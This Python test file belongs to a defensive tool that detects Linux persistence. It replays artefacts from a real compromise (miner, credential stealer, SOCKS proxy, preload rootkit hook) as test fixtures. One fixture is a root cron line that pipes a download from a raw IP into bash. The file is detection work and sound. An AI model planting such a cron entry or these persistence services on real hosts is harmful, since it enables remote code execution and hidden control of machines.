# Copyright (c) 2026, Carbonite Solutions Ltd and contributors
# For license information, please see license.txt

"""Persistence surface collection and judgement.

The headline test is `TestTheIncident`: every artefact from the compromise that
motivated this module, replayed through the rules. If one of those stops being
caught, this file should be the thing that says so.

Frappe-free — collection is filesystem work and judgement is pure, so both test
with no site and no database.
"""

from __future__ import annotations

import os
import tempfile
import unittest

from server.security import persistence, rules

P = persistence


def unit(name, exec_start="/usr/bin/thing", package="", **detail):
	base = {"ExecStart": exec_start}
	base.update(detail)
	return P.Item(
		kind=P.KIND_TIMER if name.endswith(".timer") else P.KIND_UNIT,
		identifier=name,
		content_hash="hash",
		path=f"/etc/systemd/system/{name}",
		package=package,
		detail=base,
	)


class TestTheIncident(unittest.TestCase):
	"""Every artefact from the compromise in the specification.

	Reconstructed from the forensic timeline: a proxy panel, a credential
	stealer, a SOCKS proxy, a miner, the timer that resurrected it, the root
	cron that re-downloaded it, a binary hidden in a near-miss directory, and a
	preload hook. None of it required a single attacker login, which is why an
	audit trail built only on authentication saw none of it.
	"""

	CASES = (
		("x-ui proxy panel", unit("x-ui.service", "/usr/local/x-ui/x-ui", Restart="always", User="root")),
		(
			"credential stealer",
			unit(
				"sifre-yonetici.service",
				"/usr/local/bin/sifre_yonetici",
				Restart="always",
				User="root",
				Description="Sifre Yonetim Sistemi Servisi",
			),
		),
		("SOCKS proxy", unit("microsocks.service", "/usr/local/bin/microsocks -p 1080", Restart="always", User="root")),
		("miner", unit("daemonc.service", "/opt/xmrig/xmrig", Restart="always", User="root")),
		("the timer that resurrected it", unit("daemonc.timer")),
		("binary in a hidden near-miss directory", unit("kernel.service", "/usr/.local/kernel", Restart="always", User="root")),
	)

	def test_every_artefact_is_caught_as_critical(self):
		for label, item in self.CASES:
			with self.subTest(artefact=label):
				findings = rules.judge(rules.APPEARED, item)
				self.assertTrue(findings, f"{label} produced no finding at all")
				self.assertIn(
					rules.CRITICAL,
					[f.severity for f in findings],
					f"{label} was noticed but not treated as critical",
				)

	def test_the_root_cron_that_redownloaded_the_payload(self):
		item = P.Item(
			kind=P.KIND_CRON,
			identifier="/var/spool/cron/crontabs/root",
			content_hash="h",
			detail={"lines": ["0 */6 * * * curl -s http://1.2.3.4/x | bash"]},
		)
		findings = rules.judge(rules.APPEARED, item)
		self.assertIn(rules.CRITICAL, [f.severity for f in findings])
		self.assertTrue(any("downloads and runs" in f.subject for f in findings))

	def test_the_preload_rootkit_hook(self):
		item = P.Item(
			kind=P.KIND_PRELOAD,
			identifier=P.PRELOAD_FILE,
			content_hash="h",
			detail={"entries": ["/usr/.local/libhide.so"]},
		)
		findings = rules.judge(rules.MODIFIED, item, "")
		self.assertEqual(findings[0].severity, rules.CRITICAL)


class TestNoiseControl(unittest.TestCase):
	"""An alerting system that cries wolf on day three teaches its one reader
	to stop reading it."""

	def test_an_ordinary_packaged_unit_appearing_is_not_critical(self):
		item = unit("nginx.service", "/usr/sbin/nginx", package="nginx", Restart="on-failure", User="root")
		severities = [f.severity for f in rules.judge(rules.APPEARED, item)]
		self.assertNotIn(rules.CRITICAL, severities)

	def test_a_packaged_unit_that_restarts_as_root_is_not_critical(self):
		"""Which describes most of systemd."""
		item = unit("ssh.service", "/usr/sbin/sshd -D", package="openssh-server", Restart="always", User="root")
		self.assertNotIn(rules.CRITICAL, [f.severity for f in rules.judge(rules.APPEARED, item)])

	def test_an_english_description_is_not_flagged(self):
		item = unit("thing.service", "/usr/bin/thing", package="thing", Description="Thing Daemon")
		self.assertFalse(any("description" in f.subject.lower() for f in rules.judge(rules.APPEARED, item)))

	def test_removal_of_an_ordinary_unit_is_only_informational(self):
		findings = rules.judge(rules.DISAPPEARED, unit("thing.service", package="thing"))
		self.assertEqual([f.severity for f in findings], [rules.INFO])

	def test_removal_of_a_sudoers_file_is_not(self):
		item = P.Item(kind=P.KIND_SUDOERS, identifier="/etc/sudoers.d/x", content_hash="")
		self.assertEqual(rules.judge(rules.DISAPPEARED, item)[0].severity, rules.HIGH)


class TestSuspiciousPaths(unittest.TestCase):
	def test_the_directories_every_payload_used(self):
		for path in (
			"/tmp/x",
			"/var/tmp/x",
			"/dev/shm/x",
			"/opt/xmrig/xmrig",
			"/usr/local/bin/x",
			"/usr/.local/kernel",
			"/etc/.hidden/thing",
		):
			with self.subTest(path=path):
				self.assertTrue(rules._is_suspicious_path(path))

	def test_ordinary_service_paths_are_not_suspicious(self):
		for path in ("/usr/bin/nginx", "/usr/sbin/sshd", "/usr/lib/systemd/systemd-logind"):
			with self.subTest(path=path):
				self.assertFalse(rules._is_suspicious_path(path))


class TestPackageOwnership(unittest.TestCase):
	"""`/lib` is a symlink to `usr/lib` on a merged-/usr host, so realpath
	gives `/usr/lib/...` while dpkg still records `/lib/...`.

	This marked forty stock units on this machine as owned by no package —
	forty false criticals on a clean box, which is precisely how the alerting
	would have taught its reader to ignore it.
	"""

	def test_both_spellings_are_asked_about(self):
		spellings = rules.persistence._path_spellings("/usr/lib/systemd/system/x.service")
		self.assertIn("/lib/systemd/system/x.service", spellings)
		self.assertIn("/usr/lib/systemd/system/x.service", spellings)

	def test_the_reverse_direction_too(self):
		self.assertIn("/usr/bin/thing", P._path_spellings("/bin/thing"))

	def test_an_unmergeable_path_is_asked_about_once(self):
		self.assertEqual(P._path_spellings("/etc/crontab"), ["/etc/crontab"])


class TestUnitParsing(unittest.TestCase):
	def test_the_directives_that_matter_are_kept(self):
		detail = P.parse_unit(
			"[Unit]\nDescription=Thing\n\n[Service]\n"
			"ExecStart=/usr/bin/thing --flag\nUser=root\nRestart=always\n\n"
			"[Install]\nWantedBy=multi-user.target\n"
		)
		self.assertEqual(detail["ExecStart"], "/usr/bin/thing --flag")
		self.assertEqual(detail["Restart"], "always")
		self.assertEqual(detail["Description"], "Thing")

	def test_comments_and_sections_are_ignored(self):
		self.assertEqual(P.parse_unit("# ExecStart=/evil\n[Service]\nUser=x\n"), {"User": "x"})

	def test_repeated_execstart_is_kept_whole(self):
		"""systemd allows several, and only reading the first would miss one."""
		detail = P.parse_unit("[Service]\nExecStart=/usr/bin/a\nExecStart=/tmp/b\n")
		self.assertIn("/tmp/b", detail["ExecStart"])

	def test_a_prefixed_command_still_resolves_to_its_binary(self):
		item = unit("x.service", "-/tmp/thing --flag")
		self.assertEqual(rules._exec_paths(item), ["/tmp/thing"])


class TestCoverageIsReported(unittest.TestCase):
	"""A confident empty answer is the worst outcome here.

	Running as the bench user, the per-user cron spool is unreadable — and it
	is exactly where a root schedule re-downloading a payload would live. A
	scan that returns "no cron entries" for a directory it could not open reads
	as clean.
	"""

	def test_an_unreadable_surface_is_a_finding(self):
		surfaces = [P.Surface(P.KIND_CRON, "/var/spool/cron/crontabs", False, "permission denied")]
		findings = rules.judge_coverage(surfaces)
		self.assertEqual(len(findings), 1)
		self.assertEqual(findings[0].severity, rules.HIGH)
		self.assertIn("/var/spool/cron/crontabs", findings[0].detail)

	def test_a_surface_that_simply_does_not_exist_is_not(self):
		surfaces = [P.Surface(P.KIND_BOOT, "/etc/rc.local", False, "does not exist")]
		self.assertEqual(rules.judge_coverage(surfaces), [])

	def test_readable_surfaces_produce_nothing(self):
		self.assertEqual(rules.judge_coverage([P.Surface(P.KIND_CRON, "/etc/cron.d", True)]), [])


class TestCollectionAgainstThisHost(unittest.TestCase):
	def test_it_finds_units_and_reports_coverage(self):
		items, surfaces = persistence.collect()
		self.assertTrue(items, "no persistence items found at all")
		self.assertTrue(surfaces)
		kinds = {item.kind for item in items}
		self.assertIn(P.KIND_UNIT, kinds)

	def test_preload_is_recorded_even_when_absent(self):
		"""Its APPEARANCE is the event, and a surface that only records what
		exists cannot alert on something coming into existence."""
		items, _ = persistence.collect_preload()
		self.assertEqual(len(items), 1)
		self.assertEqual(items[0].identifier, P.PRELOAD_FILE)

	def test_cron_environment_lines_are_not_commands(self):
		self.assertEqual(
			P._cron_commands("SHELL=/bin/sh\nPATH=/usr/bin\n# comment\n0 * * * * root /usr/bin/x\n"),
			["0 * * * * root /usr/bin/x"],
		)

	def test_a_missing_directory_is_not_reported_as_unreadable(self):
		with tempfile.TemporaryDirectory() as root:
			missing = os.path.join(root, "nope")
			names, reason = P._listdir(missing)
			self.assertEqual(names, [])
			self.assertEqual(reason, "does not exist")


if __name__ == "__main__":
	unittest.main()
